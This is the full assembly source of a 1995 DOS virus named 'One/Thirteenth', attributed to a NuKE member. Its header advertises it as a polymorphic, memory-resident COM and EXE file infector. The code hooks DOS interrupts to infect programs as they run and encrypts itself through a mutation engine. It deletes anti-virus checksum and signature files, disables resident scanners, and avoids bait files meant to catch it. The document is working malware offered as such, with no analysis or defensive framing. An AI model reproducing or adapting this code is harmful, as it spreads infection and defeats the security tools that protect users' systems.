
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
; One/Thirteenth - coded by ûirogen [NuKE] on 02-23-95
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
;    -Polymorphic, Memory-Resident, Parastic COM & EXE Infector
;    -Deletes Invircible Signature Files from disk no matter what name
;     they are under.
;    -Also deletes ANTI-VIR.DAT, CHKLIST.MS, and CHKLIST.CPS.
;    -Avoids Infecting InVircible Bait Files
;    -Disables VSAFE/VWATCH if in memory
;    -Avoids new format EXEs
;    -Installs it's own INT 24h
;    -EXE Id is: Checksum Not 0
;    -COM Id is: Fourth byte 0
;    -Resident Check: VSAFE/VWATCH API , ret:SI=0
;
;    Polymorphism: ûiCE v0.3á /w JMPS ON & ANTI-TBSCAN CODE ON
;
;
;
cseg	    segment
	    assume  cs: cseg, ds: cseg, es: cseg, ss: cseg

signal	    equ	    0FA01h		    ; AX=signal/INT 21h/installation chk
vsafe_word  equ	    5945h		    ; magic word for VSAFE/VWATCH API
buf_size    equ	    170
vice_size   equ	    1761+buf_size
virus_size  equ	    (offset vend-offset start)+VICE_SIZE

extrn	    _vice:  near

org	    0h
start:
	    int	    3
	    call    nx			    ; get relative offset
nx:	    mov	    si,sp		    ; no-heuristic
	    sub	    word ptr ss: [si],offset nx
	    mov	    bp,word ptr ss: [si]
	    add	    sp,2

	    push    ds es		    ; save segments for EXE
	    inc	    si
	    mov	    ax,1000
	    add	    ax,signal-1000	    ; no heuristics m0n
	    mov	    dx,vsafe_word
	    int	    21h
	    or	    si,si
	    jz	    no_install		    ; if carry then we are

	    mov	    ax,ds		    ; PSP segment
	    dec	    ax			    ; mcb below PSP m0n
	    mov	    ds,ax		    ; DS=MCB seg
	    mov	    al,'Z'		    ; no heuristics
	    cmp	    byte ptr ds: [0],al	    ; Is this the last MCB in chain?
	    jnz	    no_install
	    sub	    word ptr ds: [3],((virus_size+1023)/1024)*64*2 ; alloc MCB
	    sub	    word ptr ds: [12h],((virus_size+1023)/1024)*64*2 ; alloc PSP
	    mov	    es,word ptr ds: [12h]   ; get high mem seg
	    push    cs
	    pop	    ds
	    mov	    si,bp
	    mov	    cx,virus_size/2+1
	    xor	    di,di
	    rep	    movsw		    ; copy code to new seg
	    xor	    ax,ax
	    mov	    ds,ax		    ; null ds
	    push    ds
	    lds	    ax,ds: [21h*4]	    ; get 21h vector
	    mov	    es: word ptr old21+2,ds ; save S:O
	    mov	    es: word ptr old21,ax
	    pop	    ds
	    mov	    ds: [21h*4+2],es	    ; new int 21h seg
	    mov	    ds: [21h*4],offset new21 ; new offset
	    sub	    byte ptr ds: [413h],((virus_size+1023)*2)/1024 ;-totalmem

no_install:

	    pop	    es ds		    ; restore ES DS
            xor     ax,ax                   ; null regs
            xor     bx,bx
            xor     dx,dx
            cmp     cs: is_exe[bp],1
	    jz	    exe_return

	    lea	    si,org_bytes[bp]	    ; com return
	    mov	    di,0100h		    ; -restore first 4 bytes
	    mov	    cx,2
	    rep	    movsw

            mov     cx,100h                 ; jump back to 100h
            push    cx
_ret:	    ret

exe_return:
            mov     cx,ds                   ; calc. real CS
	    add	    cx,10h
	    add	    word ptr cs: [exe_jump+2+bp],cx
	    int	    3			    ; fix prefetch
            db      0eah
exe_jump    dd	    0
is_exe	    db	    0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Main Infection Routine
;
infect_file:

	    push    dx
	    pop	    si

	    push    ds
	    xor	    ax,ax		    ; null ES
	    mov	    es,ax
	    lds	    ax,es: [24h*4]	    ; get INT 24h vector
	    mov	    cs: old_24_off,ax	    ; save it
	    mov	    cs: old_24_seg,ds
	    mov	    es: [24h*4+2],cs	    ; install our handler
	    mov	    es: [24h*4],offset new_24
	    pop	    ds
	    push    es			    ; we'll need it later
	    push    cs
	    pop	    es

	    mov	    ax,4300h		    ; get phile attribute
	    int	    21h
	    mov	    ax,4301h		    ; null attribs
	    push    ax cx		    ; save AX-call/CX-attrib
	    xor	    cx,cx
	    int	    21h

	    mov	    ax,3d02h		    ; open the file
	    int	    21h
	    jc	    dont_do

	    mov	    bx,ax		    ; get handle

	    push    cs
	    pop	    ds

	    mov	    ah,3fh		    ; Read first bytes of file
	    mov	    cx,20h
	    lea	    dx,org_bytes
	    int	    21h

	    call    kill_anti_virus	    ; kill validation filez

	    cmp	    byte ptr org_bytes,'M'
	    jz	    do_exe
            cmp     byte ptr org_bytes,90h  ; InVircible bait?
            jz      close
            cmp     byte ptr org_bytes+3,0
	    jz	    close

	    mov	    is_exe,0

	    mov	    ax,5700h		    ; get time/date
	    int	    21h
	    push    cx dx

	    call    offset_end
	    push    ax			    ; AX=end of file

	    lea	    si,start		    ; DS:SI=start of code to encrypt
	    mov	    di,virus_size	    ; ES:DI=address for decryptor/
	    push    di			    ;       encrypted code. (at heap)
	    mov	    cx,virus_size	    ; CX=virus size
	    mov	    dx,ax		    ; DX=EOF offset
	    add	    dx,100h		    ; DX=offset decryptor will run from
	    mov	    al,00001111b	    ; jmps,anti-tbscan, garbage, no CS:
	    call    _vice		    ; call engine!

	    pop	    dx
	    mov	    ah,40h
	    int	    21h

	    call    offset_zero
	    pop	    ax			    ; restore COM file size
	    sub	    ax,3		    ; calculate jmp offset
	    mov	    word ptr new_jmp+1,ax

	    lea	    dx,new_jmp
	    mov	    cx,4
	    mov	    ah,40h
	    int	    21h

	    pop	    dx cx		    ; pop date/time
	    mov	    ax,5701h		    ; restore the mother fuckers
	    int	    21h

close:

	    pop	    cx ax		    ; restore attrib
	    int	    21h

	    mov	    ah,3eh
	    int	    21h

dont_do:
	    pop	    es			    ; ES=0
	    lds	    ax,dword ptr old_24_off ; restore shitty DOS error handler
	    mov	    es: [24h*4],ax
	    mov	    es: [24h*4+2],ds

	    ret

do_exe:

	    cmp	    word ptr exe_header[12h],0 ; is checksum (in hdr) 0?
	    jnz	    close
	    cmp	    byte ptr exe_header[18h],52h ; pklite'd?
	    jz	    exe_ok
	    cmp	    byte ptr exe_header[18h],40h ; don't infect new format exe
	    jge	    close
exe_ok:
	    push    bx

	    mov	    ah,2ch		    ; grab a random number
	    int	    21h
	    mov	    word ptr exe_header[12h],dx ; mark that it's us
	    mov	    is_exe,1

	    les	    ax,dword ptr exe_header+14h ; Save old entry point
	    mov	    word ptr ds: exe_jump, ax
	    mov	    word ptr ds: exe_jump+2, es

	    push    cs
	    pop	    es

	    call    offset_end

	    push    dx ax		    ; save file size DX:AX

	    mov	    bx, word ptr exe_header+8h ; calc. new entry point
	    mov	    cl,4		    ; *16
	    shl	    bx,cl		    ;  ^by shifting one byte
	    sub	    ax,bx		    ; get actual file size-header
	    sbb	    dx,0
	    mov	    cx,10h		    ; divide AX/CX rDX
	    div	    cx

	    mov	    word ptr exe_header+14h,dx
	    mov	    word ptr exe_header+16h,ax
	    mov	    rel_off,dx

	    pop	    ax			    ; AX:DX file size
	    pop	    dx
	    pop	    bx

	    mov	    cx,virus_size+10h	    ; calc. new size
	    adc	    ax,cx

	    mov	    cl,9		    ; calc new alloc (512)
	    push    ax
	    shr	    ax,cl
	    ror	    dx,cl
	    stc
	    adc	    dx,ax
	    pop	    ax			    ; ax=size+virus
	    and	    ah,1

	    mov	    word ptr exe_header+4h,dx
	    mov	    word ptr exe_header+2h,ax

	    lea	    si,start		    ; DS:SI=start of code to encrypt
	    mov	    di,virus_size	    ; ES:DI=address for decryptor and
	    push    di			    ;       encrypted code (at heap)
	    mov	    cx,virus_size	    ; CX=virus size
	    mov	    dx,rel_off		    ; DX=offset decryptor will run from
	    mov	    al,00001110b	    ; jmps,anti-tbscan,garbage, use CS:
	    call    _vice		    ; call engine!

	    pop	    dx
	    mov	    ah,40h
	    int	    21h

	    call    offset_zero

	    mov	    cx,18h		    ; write fiXed header
	    lea	    dx,exe_header
	    mov	    ah,40h
	    int	    21h

	    jmp	    close

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; set file ptr

offset_zero: 	    			    ; self explanitory
	    xor	    al,al
	    jmp	    set_fp
offset_end:
	    mov	    al,02h
set_fp:
	    mov	    ah,42h
	    xor	    cx,cx
	    xor	    dx,dx
	    int	    21h
	    ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Kill ANTI-VIR.DAT, CHKLIST.MS, CHKLIST.CPS, and Invircible's signature files
;
kill_anti_virus:
	    push    bx
	    mov	    ah,1ah		    ; set DTA
	    lea	    dx,ff_info
	    int	    21h
	    mov	    cx,16h		    ; include all attribs
	    lea	    dx,inv_spec
	    mov	    ah,4eh
	    int	    21h			    ; findfirst
	    jnc	    inv_loop
	    jmp	    inv_done
inv_loop:
            lea     si,f_name
            push    si
            mov     dx,si
	    cmp	    word ptr [si+4],'V-'    ; ANTI-VIR.DAT?
	    jz	    is_anti
	    cmp	    word ptr [si+8],'SM'    ; CHKLIST.MS?
	    jz	    is_anti
	    cmp	    word ptr [si+8],'PC'    ; CHKLIST.CPS?
	    jz	    is_anti
            cmp     f_sizeh,0               ; high word set?
            jnz     findnext
            cmp     f_sizel,10000           ; > 10000 bytes?
            jg      findnext
            mov     ax,3d00h
	    int	    21h
	    jc	    findnext
	    xchg    ax,bx
	    mov	    ah,3fh
            mov     cl,2
	    lea	    dx,inv_word
	    int	    21h
	    mov	    ah,3eh
	    int	    21h
            mov     ax,word ptr inv_word
            mov     cl,4
            lea     si,false_struct
test_false:                                 ; test for false positives
            cmp     ax,[si]
            jz      findnext
            inc     si
            inc     si
            loop    test_false

            xor     al,ah                   ; xor first byte by second
            lea     si,iv_struct
            mov     cl,6
test_iv:                                    ; test if invircible
            cmp     al,[si]
            jz      is_anti
            inc     si
            loop    test_iv
            jmp     findnext
is_anti:
	    mov	    ax,4301h		    ; reset attribs
	    xor	    cx,cx
	    int	    21h
	    mov	    ah,41h
	    lea	    dx,f_name
	    int	    21h
findnext:
	    mov	    al,0		    ; null out filename
            pop     di                      ; di-> fname
            mov     cl,13
	    rep	    stosb
	    mov	    ah,4fh
	    int	    21h
	    jc	    inv_done
	    jmp	    inv_loop
inv_done:
	    pop	    bx
	    ret

inv_word     dw      0
inv_spec     db      '*.*',0
iv_struct    db      5Fh,1Bh,0C4h,17h,3Dh,8Ah    ; Inv Positives
false_struct dw      'ZM'                        ; EXE Header
             dw      'KP'                        ; PKZIP archive
             dw      0EA60h                      ; ARJ archive
             dw      'ER'                        ; REM in batch files
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; new 21h

new21:

	    pushf
	    cmp	    ax,signal		    ; be it us?
	    jnz	    nchk		    ; richtig..
	    cmp	    dx,vsafe_word
	    jnz	    nchk
	    xor	    si,si
	    mov	    di,4559h
	    jmp	    jmp_org
nchk:	    cmp	    ax,4b00h		    ; execute phile?
	    jnz	    jmp_org

	    push    ax bx cx di dx si ds es
	    call    infect_file
	    pop	    es ds si dx di cx bx ax

jmp_org:
	    popf
	    db	    0eah		    ; jump far XXXX:XXXX
	    old21   dd 0

new_24:	    	    			    ; critical error handler
	    mov	    al,3		    ; prompts suck, return fail
	    iret


credits     db      'One/Thirteenth, coded by ûirogen [NuKE]'
new_jmp	    db	    0E9h,0,0,0		    ; jmp XXXX,0
rel_off	    dw	    0
exe_header:
org_bytes   db	    0CDh,20h,0,0	    ; original COM bytes | exe hdr
vend:	    	    			    ; end of virus on disk .. heap
            db      16h dup(0)              ; remaining exe header space
old_24_off  dw	    0			    ; old int24h vector
old_24_seg  dw	    0
ff_info     db      26 dup(0)
f_sizel     dw      0
f_sizeh     dw      0
f_name      db      13 dup(0)
cseg	    ends
	    end	    start

